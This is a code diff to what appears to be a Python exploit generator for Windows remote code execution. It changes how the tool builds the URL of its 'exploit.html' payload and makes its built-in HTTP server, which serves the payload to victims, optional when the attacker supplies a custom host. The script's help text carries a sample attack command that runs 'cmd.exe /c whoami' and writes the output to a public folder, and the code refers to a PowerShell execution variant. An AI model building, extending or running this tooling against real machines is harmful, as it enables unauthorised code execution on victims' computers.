@@ -49,15 +49,23 @@ if __name__ == "__main__":
         raise SystemExit("Command mode requires a command to be specified, e.g. -c 'c:\\windows\\system32\\cmd.exe /c whoami > c:\\users\\public\\pwned.txt'")
 
     payload_url = f"http://{args.url}:{args.port}/exploit.html"
+    enable_webserver = True
 
-    if args.url != "localhost":  # if not default
+    if args.url != "localhost":  # if not default, parse the custom URL
         url = urlparse(args.url)
-    if url.scheme == "":
-        raise SystemExit("Custom host mode requires HTTP or HTTPS, e.g. http://example.com")
-    if url.scheme == "http":  # assuming that the user has provided the protocol AND path
-        payload_url = f"{args.url}"
-    elif url.scheme == "https":  # assuming that the user has provided the protocol AND path
-        payload_url = f"{args.url}"
+        try:
+            path = args.url.split("/")[1]
+        except IndexError:  # no path detected in URL
+            path = None
+        if url.scheme == "http" or url.scheme == "https":  # if protocol is specified, use user input as-is
+            payload_url = f"{args.url}"
+            enable_webserver = False
+            print("Custom URL detected, webserver will be disabled")
+        elif path is not None:  # path detected in user input
+            payload_url = f"{args.url}"
+            enable_webserver = False
+            print("Custom URL detected, webserver will be disabled")
+    # if none of these execute, the payload_url will remain as defined above, formatting the URL for the user
 
     if args.mode == "command":
         # Original PowerShell execution variant
@@ -104,10 +112,11 @@ if __name__ == "__main__":
 
 
     # Host the payload
-    class Handler(http.server.SimpleHTTPRequestHandler):
-        def __init__(self, *args, **kwargs):
-            super().__init__(*args, directory="www", **kwargs)
+    if enable_webserver is True:
+        class Handler(http.server.SimpleHTTPRequestHandler):
+            def __init__(self, *args, **kwargs):
+                super().__init__(*args, directory="www", **kwargs)
 
-    print(f"Serving payload on {payload_url}")
-    with socketserver.TCPServer((args.host, args.port), Handler) as httpd:
-        httpd.serve_forever()
+        print(f"Serving payload on {payload_url}")
+        with socketserver.TCPServer((args.host, args.port), Handler) as httpd:
+            httpd.serve_forever()
